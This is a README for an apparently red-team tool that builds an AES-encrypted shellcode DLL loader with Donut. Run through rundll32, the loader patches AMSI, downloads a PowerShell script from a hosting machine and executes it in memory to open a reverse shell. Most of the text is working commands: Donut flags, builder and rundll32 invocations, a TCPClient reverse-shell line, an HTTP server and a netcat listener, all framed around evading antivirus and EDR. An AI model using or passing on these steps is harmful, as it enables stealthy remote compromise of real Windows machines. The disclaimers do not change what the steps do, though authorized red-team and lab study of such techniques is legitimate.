# 🧬 AES-Encrypted DLL Loader – Donut + PowerShell

## ⚡ Quick Overview
This project builds a DLL which, when executed (e.g., via `rundll32`), decrypts in-memory shellcode previously generated and encrypted with AES. The shellcode is created using [Donut](https://github.com/TheWover/donut) and contains a C# loader that downloads and runs a PowerShell script, ultimately establishing a reverse shell.

> **Warning:**  
> Use this project **only** in controlled lab environments and for educational purposes. Any unauthorized usage in production environments can be illegal and is the sole responsibility of the user.

---

## 🎯 Motivation
Shellcode generated by tools like `msfvenom` often triggers modern antivirus and EDR solutions. Even encoders might not bypass typical behavioral signatures. To improve evasion:

- **Donut** is used instead of `msfvenom` to produce shellcode from a .NET executable.
- The shellcode is **AES-encrypted** via a custom Python script.
- The DLL (`loader.dll`) decrypts and executes the payload in memory, making it harder to detect.

This method is intended for Red Team exercises or advanced pentesting labs (like OSEP). It has been tested with **Windows Defender enabled**.

---

## 🧩 Step 1: Compile the C# Loader
1. Open `Loader.cs`.
2. This loader **patches AMSI** using .NET Reflection, then downloads a remote PowerShell script (`shell.ps1`) and executes it in-memory.
3. Update the hardcoded IP/URL so that it points to the machine hosting `shell.ps1`.

**Note on dependencies:**  
You might need to reference `System.Management.Automation.dll`, for example:
    C:\Program Files\WindowsPowerShell\Modules\PowerShellGet\<version>\System.Management.Automation.dll
Also ensure that your PowerShell execution policy allows scripts to run, or use a bypass method.

---

## 🏗️ Step 2: Generate Shellcode with Donut
Use Donut to transform your .NET executable (`Loader.exe`) into raw shellcode:
    
    donut.exe -i Loader.exe -a 2 -f 1 -b 1 -o shellcode.bin

**Explanation of flags**:
- `-a 2`: Target architecture (x64).
- `-f 1`: Output format: raw (binary).
- `-b 1`: AMSI/WLDP/ETW bypass level (0 = none, 1 = always, etc.).

> **Tip:** This Donut command is tested on Windows. You can transfer `shellcode.bin` to a Linux machine for encryption.

---

## 🏷️ Step 3: Encrypt and Compile
Run the `AES_DLL_Builder.py` script to embed (or not) the encryption key.

### Option A: Standalone (key embedded)

    python3 AES_DLL_Builder.py --standalone shellcode.bin

It will generate `loader.dll` with the key embedded. Then, on the Windows target:

    rundll32 loader.dll,EPoint

### Option B: Non-Standalone (key supplied at runtime)

    python3 AES_DLL_Builder.py --non-standalone shellcode.bin

On the Windows target:

    rundll32 loader.dll,EPoint "my_key_123"

---

## 🌐 Step 4: Host the PowerShell Script
1. Create a `shell.ps1` file containing reverse shell logic (for example):
    
        $client = New-Object System.Net.Sockets.TCPClient("192.168.1.XX",443)
        # ...
    
2. Serve it via HTTP:
    
        python3 -m http.server 80
    
3. Ensure the IP and port in `shell.ps1` match your listening service.

---

## 📡 Step 5: Start a Netcat Listener
Set up a netcat listener (optionally with `rlwrap` to improve shell handling):
    
    rlwrap -cAr nc -lnvp 443

---

## ⚠️ Legal Disclaimer
This project is provided **exclusively** for educational purposes and authorized penetration testing.  
**Do not** use it without explicit permission, as it may violate local laws and regulations.  
The authors assume no responsibility for any misuse or damage caused by this software.

